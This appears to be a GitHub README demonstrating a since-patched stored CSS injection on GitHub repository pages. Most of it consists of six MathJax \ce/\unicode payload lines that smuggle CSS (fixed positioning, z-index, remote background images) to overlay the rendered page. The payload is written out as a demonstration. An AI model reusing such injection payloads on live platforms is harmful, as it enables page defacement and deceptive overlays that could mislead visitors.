
# GITHUB CSS VULN TEST >_<
![image](https://github.com/tr4xnz/css-vuln/assets/171883047/f068a0ae-8df2-4bbf-9fee-ec912725a884)
The Github CSS Vuln, a vulnerability where README.md macros were exploited to edit the CSS on one's repository's page, and it'll be stored on the server.
This vulnerability's discovery was very surprising as Github is like a huge platform where major companies and developers share their projects and ideas.
Luckily the vulnerability was patched.
![image](https://github.com/tr4xnz/css-vuln/assets/171883047/788805fd-a1b9-4db0-a9ee-5fe30fc1ca69)

```diff
Hello i am tr4xnz
```

```math
\ce{$\unicode[goombafont; color:red; z-index: -1; position: fixed; top: 0; left: 0; height: 100%; object-fit: cover; width: 100%; opacity: 0.7; background: url('https://raw.githubusercontent.com/tr4xnz/css-vuln/master/Untitled.png'); background-size: cover]{x0000}$}
\ce{$\unicode[goombafont; color:red; z-index: 1000; position: fixed; left: 0; background-repeat: no-repeat; height: 300px; object-fit: cover; width: 300px; background: url('https://raw.githubusercontent.com/tr4xnz/css-vuln/master/Untitled.png'); background-size: cover]{x0000}$}
\ce{$\unicode[goombafont; color:red; z-index: 1000; position: fixed; right: 5vh; background-repeat: no-repeat; height: 280px; object-fit: cover; width: 280px; background: url('https://raw.githubusercontent.com/tr4xnz/css-vuln/master/Untitled.png'); background-size: cover]{x0000}$}
\ce{$\unicode[goombafont; color:red; z-index: 1000; position: fixed; left: 0; top: 12vh; background-repeat: no-repeat; height: 280px; object-fit: cover; width: 280px; background: url('https://raw.githubusercontent.com/tr4xnz/css-vuln/master/Untitled.png'); background-size: cover]{x0000}$}
\ce{$\unicode[goombafont; color:red; z-index: 1000; position: fixed; right: 0; top: 4vh; background-repeat: no-repeat; height: 252px; object-fit: cover; width: 340px; background: url('https://raw.githubusercontent.com/tr4xnz/css-vuln/master/Untitled.png'); background-size: cover]{x0000}$}
\ce{$\unicode[goombafont; color:red; z-index: 1000; position: fixed; right: 2vh; bottom: 0; background-repeat: no-repeat; height: 249px; object-fit: cover; width: 213px; background: url('https://raw.githubusercontent.com/tr4xnz/css-vuln/master/Untitled.png'); background-size: cover]{x0000}$}


```
